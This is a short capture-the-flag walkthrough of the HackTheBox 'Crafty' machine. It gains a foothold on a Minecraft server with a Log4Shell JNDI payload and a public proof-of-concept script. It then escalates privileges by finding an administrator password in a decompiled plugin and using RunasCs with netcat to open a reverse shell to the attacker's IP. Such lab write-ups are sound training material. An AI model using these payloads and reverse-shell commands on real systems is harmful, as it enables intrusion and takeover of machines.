





# Foothold


we immediately can tell its a log4j exploit in the famous minecraft game. 


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240217215602.png)


we found a payload from github. all we needed was to change the payload type from bash to cmd

https://github.com/kozmer/log4j-shell-poc


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240304225839.png)


execute the script 

```
python3 poc.py --userip 10.10.16.45 --webport 8888 --lport 81
```


payload in minecraft 

```
${jndi:ldap://10.10.16.45:1389/a}
```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240304225714.png)





# Privesc


after looking around we found a plugins folder. we use use `jd-GUI` and see what can be a potentiall password 

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240305211740.png)

im no good at java but this might be a password 

we try using runascs and it is the password for admin

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240305211819.png)


we then upload `nc.exe` to make it connect back to use as admin


```
.\RunasCs.exe Administrator s67u84zKq8IXw "C:\Users\svc_minecraft\Desktop\nc.exe 10.10.16.45 1338 -e cmd.exe" -t 0
```


and we are admin

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/hackthebox/Boxes/Crafty/Screenshots/Pasted%20image%2020240305213413.png)
